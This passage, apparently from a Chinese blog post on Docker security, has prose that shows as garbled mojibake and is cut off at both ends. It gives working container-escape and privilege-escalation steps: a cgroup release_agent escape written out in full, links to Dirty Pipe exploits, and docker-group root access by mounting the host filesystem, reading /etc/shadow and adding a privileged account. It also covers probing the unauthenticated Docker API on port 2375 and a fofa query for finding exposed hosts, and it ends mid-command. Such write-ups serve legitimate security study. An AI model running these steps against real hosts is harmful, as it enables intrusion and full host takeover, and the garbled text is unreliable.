éœ€CAP_SYS_ADMIN)ï¼Œå½“å®¹å™¨æ²¡æœ‰å¼€å¯é¢å¤–å®‰å…¨æªæ–½æ—¶ï¼Œè·å¾—å®¹å™¨å†…rootæƒé™å³å¯é€ƒé€¸åˆ°å®¿ä¸»æœº<br>æ¼æ´äº§å“: linux kernel - cgroup</p><h3 id="çŸ¥è¯†è¡¥å……-1"><a href="#çŸ¥è¯†è¡¥å……-1" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h3><p>cgroup:<br>cgroup å³Linux Control Groupï¼Œ æ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”¨æ¥é™åˆ¶ï¼Œæ§åˆ¶ä¸åˆ†ç¦»ä¸€ä¸ªè¿›ç¨‹ç»„ç¾¤çš„èµ„æº(å¦‚CPUã€å†…å­˜ã€ç£ç›˜è¾“å…¥è¾“å‡ºç­‰)<br>cgroup æœ‰å¦‚ä¸‹å­ç³»ç»Ÿ:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mel">devices <span class="hljs-comment">//è¿›ç¨‹èŒƒå›´è®¾å¤‡æƒé™</span><br>cpuset <span class="hljs-comment">//åˆ†é…è¿›ç¨‹å¯ä½¿ç”¨çš„ CPUæ•°å’Œå†…å­˜èŠ‚ç‚¹</span><br>cpu <span class="hljs-comment">//æ§åˆ¶CPUå æœ‰ç‡</span><br>cpuacct <span class="hljs-comment">//ç»Ÿè®¡CPUä½¿ç”¨æƒ…å†µï¼Œä¾‹å¦‚è¿è¡Œæ—¶é—´ï¼Œthrottledæ—¶é—´</span><br><span class="hljs-keyword">memory</span> <span class="hljs-comment">//é™åˆ¶å†…å­˜çš„ä½¿ç”¨ä¸Šé™</span><br>freezer <span class="hljs-comment">//æš‚åœ Cgroup ä¸­çš„è¿›ç¨‹</span><br>net_cls <span class="hljs-comment">//é…åˆ tc(traffic controller)é™åˆ¶ç½‘ç»œå¸¦å®½</span><br>net_prio <span class="hljs-comment">//è®¾ç½®è¿›ç¨‹çš„ç½‘ç»œæµé‡ä¼˜å…ˆçº§</span><br>huge_tlb <span class="hljs-comment">//é™åˆ¶ HugeTLB çš„ä½¿ç”¨</span><br>perf_event <span class="hljs-comment">//å…è®¸ Perf å·¥å…·åŸºäº Cgroup åˆ†ç»„åšæ€§èƒ½æ£€æµ‹</span><br></code></pre></td></tr></table></figure><p>å®¿ä¸»æœºä¸­çš„cgroup éƒ½åœ¨&#x2F;sys&#x2F;fs&#x2F;cgroup ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å„ä¸ªcgroup å­ç³»ç»Ÿ</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-45.png" class="" title="2024-02-17_09-45.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>docker ä¸­å¯¹åº”çš„cgroup å­ç³»ç»Ÿå°±æ˜¯å®¿ä¸»æœºä¸­è¯¥cgroup çš„å­èŠ‚ç‚¹ï¼Œdockerä¸­æŸ¥çœ‹memory cgroup<br>å¦‚æœä¸€ä¸ªæœåŠ¡å™¨æœ‰ä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·ï¼Œå¹¶ä¸”è¿™ä¸ªç”¨æˆ·åŠ å…¥äº† docker ç»„ï¼Œåˆ™è¿™ä¸ªç”¨æˆ·å·²ç»æ˜¯ root äº†</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-45_1.png" class="" title="2024-02-17_09-45_1.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>ä¸»æœºdocker ç›®å½•ä¸­çš„å¯¹åº”å®¹å™¨åèŠ‚ç‚¹ï¼Œä¸€æ¨¡ä¸€æ ·</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-46.png" class="" title="2024-02-17_09-46.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>release_agent:<br>cgroupçš„æ¯ä¸€ä¸ªsubsysteméƒ½æœ‰å‚æ•°notify_on_releaseï¼Œè¿™ä¸ªå‚æ•°å€¼æ˜¯Booleanå‹ï¼Œ1æˆ–0ã€‚åˆ†åˆ«å¯ä»¥å¯åŠ¨å’Œç¦ç”¨é‡Šæ”¾ä»£ç†çš„æŒ‡ä»¤ã€‚å¦‚æœnotify_on_releaseå¯ç”¨(ä¸º1)ï¼Œå½“cgroupä¸å†åŒ…å«ä»»ä½•ä»»åŠ¡æ—¶ï¼ˆå³cgroupä¸­æœ€åä¸€ä¸ªè¿›ç¨‹é€€å‡ºçš„æ—¶å€™ï¼Œcgroupçš„tasksæ–‡ä»¶é‡Œçš„PIDä¸ºç©ºæ—¶ï¼‰ï¼Œç³»ç»Ÿå†…æ ¸ä¼šæ‰§è¡Œrelease_agentå‚æ•°æŒ‡å®šçš„æ–‡ä»¶é‡Œçš„å†…å®¹.é€šè¿‡ä¿®æ”¹notify_on_release æ–‡ä»¶çš„å½¢åŠ¿ä¿®æ”¹notify_on_releaseçš„å€¼</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-50.png" class="" title="2024-02-17_09-50.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>æ¼æ´å‘ç”Ÿå°±ä½äºå¯¹release_agent çš„ä¿®æ”¹ï¼Œåœ¨åŸæœ¬åªè¦å¯ä»¥æ“ä½œcgroup ä¾¿å¯å¯¹release_agent è¿›è¡Œä¿®æ”¹ï¼Œè€Œéœ€è¦CAP_SYS_ADMINæ‰å¯ä»¥ä½¿ç”¨cgroupã€‚ä½†åæ¥æœ‰äººç ”ç©¶å‘ç°é€šè¿‡unshareå‘½ä»¤åˆ›å»ºæ–°çš„namespaceå¯ä»¥è·å¾—å…¨éƒ¨çš„capbilitiesï¼Œé‚£ä¹ˆå¯¹äºCAP_SYS_ADMIN çš„é™åˆ¶å°±ä¸å­˜åœ¨äº†ï¼Œæ¼æ´åˆ©ç”¨çš„é—¨æ§›ä¸€ä¸‹å­é™ä½äº†å¾ˆå¤š</p><p>unshareå‘½ä»¤ï¼š<br>unshare å‘½ä»¤åŠŸèƒ½ä¸ºå–æ¶ˆæŒ‡å®šçš„å…±äº«çˆ¶è¿›ç¨‹ä¸­æŒ‡å®šçš„å‘½åç©ºé—´ï¼Œç„¶åæ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºå¹¶åŠ å…¥æ–°åˆ›å»ºçš„namespaceã€‚å’Œæˆ‘ä»¬æ¼æ´åˆ©ç”¨ç›¸å…³çš„å°±æ˜¯ï¼Œunshare æ–°åˆ›å»ºçš„namespace æ‹¥æœ‰åŒ…æ‹¬CAP_SYS_ADMINåœ¨å†…çš„å…¨éƒ¨çš„capbilities</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-39.png" class="" title="2024-02-17_09-39.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>åœ¨å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„å†…æ ¸çš„linuxä¸­ä½¿ç”¨docker å³å¯ï¼Œæˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨metargetæ­å»ºç¯å¢ƒ</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-21.png" class="" title="2024-02-17_09-21.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>å¸¦æœ‰ sys_admin å¯åŠ¨ Dockerï¼Œ å…³é—­ apparmor</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --rm -it <span class="hljs-attribute">--cap-add</span>=SYS_ADMIN <span class="hljs-attribute">--security-opt</span>=<span class="hljs-string">&quot;apparmor=unconfined&quot;</span> ubuntu:20.04 /bin/bash<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯å¸¦æœ‰ CAP_SYS_ADMIN æƒé™çš„ Dockerï¼Œå½“è¿›è¡Œmount çš„æ—¶å€™ä¼šä¸»åŠ¨åŠ è½½ release_agent<br>è¿›å…¥ Docker å†…éƒ¨ï¼Œé¦–å…ˆæŒ‚è½½ cgroup</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-29.png" class="" title="2024-02-17_09-29.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>ä¿®æ”¹ release_agent è§¦å‘é€ƒé€¸ï¼Œå°† notify_on_release è®¾ç½®ä¸º1ï¼Œå¼€å¯ task è¿›ç¨‹æ¸…ç©ºåæ‰§è¡Œ release_agent åŠŸèƒ½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/tmp/</span>testcgroup<span class="hljs-regexp">/x/</span>notify_on_release<br></code></pre></td></tr></table></figure><p>åˆ›å»º release_agent è§¦å‘æ—¶æ‰§è¡Œçš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /cmd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ps -ef &gt;&gt; <span class="hljs-variable">$host_path</span>/result&quot;</span>  &gt;&gt; /cmd<br><span class="hljs-built_in">chmod</span> 777 /cmd<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹release_agent ï¼ŒæŒ‡å‘ cmd æ–‡ä»¶åœ¨å®¿ä¸»æœºä¸­çš„è·¯å¾„ï¼ˆä¸Šé¢å·²ç»è·å–äº†å®¹å™¨æ ¹ç›®å½•åœ¨å®¿ä¸»æœºä¸­çš„è·¯å¾„ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/testcgroup/release_agent<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å‘ x cgroup èŠ‚ç‚¹ä¸­è¾“å…¥ä¸€ä¸ªä»»åŠ¡ï¼Œå°†è‡ªå·±æ‰€å±çš„ sh çš„pid å†™å…¥ cgroup.procs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sh <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;echo \<span class="hljs-variable">$</span>\<span class="hljs-variable">$</span> &gt;  /tmp/testcgroup/x/cgroup.procs&quot;</span><br></code></pre></td></tr></table></figure><p>sh å‘½ä»¤åªæ‰§è¡Œäº†ä¸€ä¸ª echo æŒ‡ä»¤ï¼Œä¸€ç¬é—´å°±ä¼šç»“æŸï¼Œé‚£ä¹ˆ x cgroup èŠ‚ç‚¹ä¸­å°± &#x2F; æ²¡æœ‰ä»»ä½•ä»»åŠ¡äº†ï¼Œè§¦å‘ notify_on_release æ‰§è¡Œ release_agent æŒ‡å‘çš„ &#x2F;cmd æ–‡ä»¶ï¼Œå†…æ ¸è§¦å‘ï¼Œåœ¨å®¹å™¨å¤–æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‘½ä»¤ï¼Œå®Œæˆé€ƒé€¸</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-32.png" class="" title="2024-02-17_09-32.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-33.png" class="" title="2024-02-17_09-33.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><h2 id="ä»è„ç®¡é“åˆ°Dockeré€ƒé€¸"><a href="#ä»è„ç®¡é“åˆ°Dockeré€ƒé€¸" class="headerlink" title="ä»è„ç®¡é“åˆ°Dockeré€ƒé€¸"></a>ä»è„ç®¡é“åˆ°Dockeré€ƒé€¸</h2><h3 id="è„ç®¡é“ä»‹ç»"><a href="#è„ç®¡é“ä»‹ç»" class="headerlink" title="è„ç®¡é“ä»‹ç»"></a>è„ç®¡é“ä»‹ç»</h3><p>æåˆ°è„ç®¡é“ï¼Œå°±ä¸å¾—ä¸è¯´CVE-2022-0847ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ˜¯å­˜åœ¨äº Linux å†…æ ¸ 5.8 åŠä¹‹åç‰ˆæœ¬ä¸­çš„æœ¬åœ°ææƒæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯è¦†ç›–é‡å†™ä»»æ„å¯è¯»æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œä»è€Œå¯å°†æ™®é€šæƒé™çš„ç”¨æˆ·æå‡åˆ°ç‰¹æƒ rootï¼Œæ¼æ´åŸç†ç±»ä¼¼äº CVE-2016-5195 è„ç‰›æ¼æ´ï¼ˆDirty Cowï¼‰ï¼Œä½†å®ƒæ›´å®¹æ˜“è¢«åˆ©ç”¨ã€‚æ¼æ´ä½œè€…å°†æ­¤æ¼æ´å‘½åä¸º Dirty Pipeï¼ˆè„ç®¡é“ï¼‰</p><p>æ¼æ´åˆ©ç”¨ï¼š<br>exp: <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git</a><br>     <a href="https://github.com/Al1ex/CVE-2022-0847">https://github.com/Al1ex/CVE-2022-0847</a><br>ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼šä¸€ç§æ˜¯ä¿®æ”¹&#x2F;è¦†ç›–åªè¯»æ–‡ä»¶ææƒï¼Œå¦ä¸€ç§æ˜¯åŠ«æŒ SUID äºŒè¿›åˆ¶æ–‡ä»¶ææƒ<br>ç¬¬ä¸€ç§æˆ‘å¤±è´¥äº†ï¼Œåº”è¯¥æ˜¯å†…æ ¸ç‰ˆæœ¬çš„é—®é¢˜</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_10-50.png" class="" title="2024-02-17_10-50.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>ç¬¬äºŒç§ä»¥ root èº«ä»½è¿è¡Œçš„åªè¯» SUID è¿›ç¨‹å†…å­˜ä¸­æ³¨å…¥å’Œè¦†ç›–æ•°æ®</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_10-48.png" class="" title="2024-02-17_10-48.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><h3 id="åˆ©ç”¨æ¡ä»¶ä¸é™åˆ¶"><a href="#åˆ©ç”¨æ¡ä»¶ä¸é™åˆ¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ä¸é™åˆ¶"></a>åˆ©ç”¨æ¡ä»¶ä¸é™åˆ¶</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š<br>1ã€æœ‰å¯è¯»æƒé™æˆ–è€…å¯ä»¥ä¼ å›æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ã€‚<br>2ã€æœ‰æ¼æ´çš„å†…æ ¸</p><p>åˆ©ç”¨çš„é™åˆ¶ï¼š<br>1ã€ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸å¯ä¿®æ”¹ï¼Œå¹¶ä¸”å•æ¬¡å†™å…¥ä¸èƒ½å¤§äº 4k<br>2ã€åªèƒ½å•çº¯è¦†ç›–ï¼Œä¸èƒ½è°ƒæ•´æ–‡ä»¶å¤§å°<br>3ã€ç”±äºæ¼æ´åŸºäºå†…å­˜é¡µï¼Œæ‰€ä»¥ä¸ä¼šå¯¹ç£ç›˜æœ‰å½±å“</p><h3 id="ä¸Dockerçš„å…³ç³»"><a href="#ä¸Dockerçš„å…³ç³»" class="headerlink" title="ä¸Dockerçš„å…³ç³»"></a>ä¸Dockerçš„å…³ç³»</h3><p>ç”±äº Docker å’Œå®¿ä¸»æœºæ˜¯å…±äº«å†…æ ¸ï¼Œå°½ç®¡ä¸å…¶ä»–è¿›ç¨‹èµ„æºæ˜¯éš”ç¦»å¼€çš„ï¼Œå†…æ ¸æ¼æ´ä¹Ÿå¾ˆå¯èƒ½ä¼šå¯¹ Docker å®¹å™¨é€ æˆå®‰å…¨é—®é¢˜<br>å¯¹äºå®¹å™¨çš„å½±å“ï¼š<br>å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªå®¹å™¨ï¼šliu1å’Œliu2ï¼Œç”±äº Docker æœ¬è´¨ä¸Šæ˜¯ç”±ä¸€ç»„äº’ç›¸é‡å çš„å±‚æ‰€ç»„å±‚çš„ï¼Œç„¶åå®¹å™¨å¼•æ“å°†å…¶åˆå¹¶åˆ°ä¸€èµ·ï¼ŒåŸæœ¬è¿™äº›å±‚éƒ½æ˜¯åªè¯»çš„ï¼Œä½†ç”±äºè„ç®¡é“æ¼æ´çš„å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ liu1 å®¹å™¨é‡Œä¿®æ”¹ &#x2F;etc&#x2F;passwd ä½¿å¾— liu2 å®¹å™¨çš„ &#x2F;etc&#x2F;passwd è¢«ä¿®æ”¹</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_11-13.png" class="" title="2024-02-17_11-13.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><h2 id="dockerç”¨æˆ·ç»„ææƒ"><a href="#dockerç”¨æˆ·ç»„ææƒ" class="headerlink" title="dockerç”¨æˆ·ç»„ææƒ"></a>dockerç”¨æˆ·ç»„ææƒ</h2><p>Docker éœ€è¦ root æƒé™æ‰èƒ½è·‘èµ·æ¥,å…¶è¿è¡Œçš„æ‰€æœ‰å‘½ä»¤éƒ½æ˜¯éœ€è¦ sudo æ¥è¿è¡Œï¼Œå› æ­¤ Docker ç›‘æŠ¤è¿›ç¨‹æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒèƒ½è¢«å…è®¸è®¿é—® root ç”¨æˆ·æˆ–è€…æ˜¯åœ¨ docker ç»„é‡Œé¢çš„æ‰€æœ‰ç”¨æˆ·ï¼Œè¿™å°±å¦‚åŒæ‹¥æœ‰ root çš„è®¿é—®æƒé™ã€‚ç®€è€Œè¨€ä¹‹,å¦‚æœæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªdockerç»„å†…ç”¨æˆ·çš„æƒé™,å°±å¯ä»¥æå‡åˆ°rootæƒé™</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å¦‚æœä¸€ä¸ªæœåŠ¡å™¨æœ‰ä¸€ä¸ªæ™®é€šçš„ç”¨æˆ·ï¼Œå¹¶ä¸”è¿™ä¸ªç”¨æˆ·åŠ å…¥äº† docker ç»„ï¼Œåˆ™è¿™ä¸ªç”¨æˆ·å·²ç»æ˜¯ root äº†<br>æ–¹æ³•ä¸€ï¼š<br>ç¯å¢ƒæ­å»º</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">adduser </span><span class="hljs-keyword">joker</span><br><span class="hljs-keyword"></span>usermod -G docker <span class="hljs-keyword">joker</span><br><span class="hljs-keyword"></span>newgrp docker<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-03.png" class="" title="2024-02-17_15-03.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker è½¯ä»¶åŒ…æ˜¯ä¼šé»˜è®¤æ·»åŠ ä¸€ä¸ª docker ç”¨æˆ·ç»„çš„ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ä¼šå…è®¸ root ç”¨æˆ·å’Œ dockerç»„ç”¨æˆ·è®¿é—® Dockerï¼Œç»™ç”¨æˆ·æä¾› Docker æƒé™å°±ç›¸å½“äºç»™ç”¨æˆ·æ— éœ€è®¤è¯ä¾¿å¯ä»¥éšä¾¿è·å–çš„ root æƒé™</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-04.png" class="" title="2024-02-17_15-04.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>å‚æ•° -v å°†å®¹å™¨å¤–éƒ¨çš„ç›®å½• &#x2F; æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ &#x2F;hostOSï¼Œç„¶åè·å–åˆ°å®¿ä¸»æœºçš„ root æƒé™</p><p>æ–¹æ³•äºŒï¼š<br>ç¯å¢ƒæ­å»º</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">adduser <span class="hljs-keyword">test</span>-docker<br>usermod -G docker <span class="hljs-keyword">test</span>-docker<br>newgrp docker<br></code></pre></td></tr></table></figure><p>å°† &#x2F;etc&#x2F; ç›®å½•æŒ‚è½½è¿› Dockerï¼ŒæŸ¥çœ‹ shadow å’Œ passwd</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-13.png" class="" title="2024-02-17_15-13.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>è¿™é‡Œå·²ç»è·å–åˆ°å¯†ç  hashï¼Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªç‰¹æƒè´¦å·</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt test-d<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-16.png" class="" title="2024-02-17_15-16.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-20.png" class="" title="2024-02-17_15-20.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><h2 id="dockerè¿œç¨‹APIæœªæˆæƒè®¿é—®é€ƒé€¸"><a href="#dockerè¿œç¨‹APIæœªæˆæƒè®¿é—®é€ƒé€¸" class="headerlink" title="dockerè¿œç¨‹APIæœªæˆæƒè®¿é—®é€ƒé€¸"></a>dockerè¿œç¨‹APIæœªæˆæƒè®¿é—®é€ƒé€¸</h2><p>Dockerçš„2375ç«¯å£ä¸»è¦ç”¨äºDockerå®ˆæŠ¤è¿›ç¨‹çš„ç›‘å¬å’Œé€šä¿¡ã€‚å®ƒä¸»è¦ç”¨äºDockerå®¹å™¨çš„ç½‘ç»œè¿æ¥å’Œé€šä¿¡ï¼ŒåŒ…æ‹¬å®¹å™¨çš„å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ç­‰æ“ä½œã€‚è¯¥ç«¯å£å¯ä»¥è¢«Dockerå®ˆæŠ¤è¿›ç¨‹ç”¨äºæ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸å…¶è¿›è¡Œäº¤äº’å’Œé€šä¿¡ï¼Œåœ¨æ—©æœŸçš„ç‰ˆæœ¬å®‰è£…Dockeræ˜¯ä¼šé»˜è®¤å°†2375ç«¯å£å¯¹å¤–å¼€æ”¾,ç›®å‰æ”¹ä¸ºé»˜è®¤åªå…è®¸æœ¬åœ°è®¿é—®ã€‚è€Œdockerè¿œç¨‹APIæœªæˆæƒè®¿é—®æ¼æ´åŸç†å°±æ˜¯ï¼šdocker remote api å¯ä»¥æ‰§è¡Œ docker å‘½ä»¤ï¼Œdocker å®ˆæŠ¤è¿›ç¨‹ç›‘å¬åœ¨ 0.0.0.0ï¼Œå¯ç›´æ¥è°ƒç”¨ API æ¥æ“ä½œ docker</p><p>å¦‚ä½•å¼€å¯è¿œç¨‹è®¿é—®ï¼ˆç¯å¢ƒæ­å»ºï¼‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç¬¬ä¸€ç§ï¼š<br>vim <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>docker.service<br><br>ExecStart=<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/dockerd -H fd:/</span><span class="hljs-regexp">/ -H tcp:/</span>/<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br>--containerd=<span class="hljs-regexp">/run/</span>containerd/containerd.sock<br><br>ç¬¬äºŒç§ï¼š<br>dockerd -H unix:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>run/docker.sock -H <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><p>å¦‚ä½•æ£€æµ‹2375ç«¯å£å­˜åœ¨æœªæˆæƒ?<br>å¯ä»¥ç›´æ¥åœ¨æµè§ˆå™¨è®¿é—®æ•æ„Ÿæ¥å£</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_16-33.png" class="" title="2024-02-17_16-33.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>æˆ–è€…é€šè¿‡ä¸‹é¢è¿™æ¡æŒ‡ä»¤ï¼Œå¦‚æœè¿”å›404ï¼Œè¯´æ˜å­˜åœ¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">IP</span>=`hostname -i | awk -F. &#x27;&#123;print $<span class="hljs-number">1</span> <span class="hljs-string">&quot;.&quot;</span> $<span class="hljs-number">2</span> <span class="hljs-string">&quot;.&quot;</span> $<span class="hljs-number">3</span> <span class="hljs-string">&quot;.1&quot;</span>&#125;&#x27; ` &amp;&amp; wget http://$IP:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-42.png" class="" title="2024-02-17_15-42.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>fofaè¯­æ³•ç´¢å¼•</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">port</span>=<span class="hljs-string">&quot;2375&quot;</span> &amp;&amp; country=<span class="hljs-string">&quot;CN&quot;</span> &amp;&amp; <span class="hljs-string">&quot;Docker&quot;</span> //countryè‡ªæ”¹<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-18_14-32.png" class="" title="2024-02-18_14-32.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><h2 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>&lt;target&gt;:<span 